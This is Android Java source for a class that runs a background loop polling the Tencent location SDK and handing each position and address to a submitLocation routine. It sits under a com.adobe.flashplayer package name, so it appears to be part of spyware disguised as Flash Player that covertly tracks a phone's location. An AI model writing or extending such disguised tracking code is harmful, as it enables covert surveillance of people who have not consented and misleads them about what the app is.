package com.adobe.flashplayer.data.Location;

import com.adobe.flashplayer.data.PhoneLocationListener;
import com.tencent.map.geolocation.TencentLocation;
import com.tencent.map.geolocation.TencentLocationListener;
import com.tencent.map.geolocation.TencentLocationManager;
import com.tencent.map.geolocation.TencentLocationManagerOptions;
import com.tencent.map.geolocation.TencentLocationRequest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Looper;
import android.util.Log;



public class MyTencentLocation implements Runnable , TencentLocationListener{

	private TencentLocationListener listener = null;

	private TencentLocationManager locationManager = null;

	public static final int REQUEST_LEVEL_POI = 4;

	private TencentLocationRequest request = null;

	private Context mContext;

	private String TAG = "[ljg]MyTencentLocation ";

	int mInterval = 0;

	public MyTencentLocation(Context context,int interval){

		mContext = context;

		if (interval > 3600){
			interval = 3600;
		}
		if (interval <= 0){
			interval = 600;
		}
		mInterval = interval*1000;
	}


	public void stopLocation(Context context){
		if(listener != null){
			locationManager.removeUpdates(listener);

			Looper.myLooper().quitSafely();
		}
	}


	@Override
	public void run() {
		Looper.prepare();

		try {

			listener = this;

			request = TencentLocationRequest.create();

			locationManager = TencentLocationManager.getInstance(mContext);

			request.setRequestLevel(REQUEST_LEVEL_POI);

			request.setInterval(mInterval);

			request.setAllowGPS(true);
			request.setIndoorLocationMode(true);
			request.setAllowDirection(false);

			//TencentLocationManagerOptions.setLoadLibraryEnabled(false);
			//String libpath = context.getApplicationInfo().nativeLibraryDir();
			//String libpath = "/data/data/" + mContext.getPackageName() + "/lib/libtencentloc.so";
			//System.load(libpath);

			int error = locationManager.requestLocationUpdates(request, listener);

			Log.e(TAG,"result:" + error);
		} catch (Exception e) {
			e.printStackTrace();
		}

		Looper.loop();
	}


	@Override
    public void onLocationChanged(TencentLocation location, int error, String reason) {
    	Log.e(TAG,"onLocationChanged reason:" + reason + " errro:" + String.valueOf(error) );
        if (TencentLocation.ERROR_OK == error) {

        	PhoneLocationListener.submitLocation(location.getLatitude(), location.getLongitude(), location.getAddress(), mContext);
        } else {
            return;
        }
    }



	@Override
    public void onStatusUpdate(String name, int status, String desc) {
        Log.e(TAG,"onStatusUpdate name:" + name + " status:" + status + " desk:" + desc);
    }

}


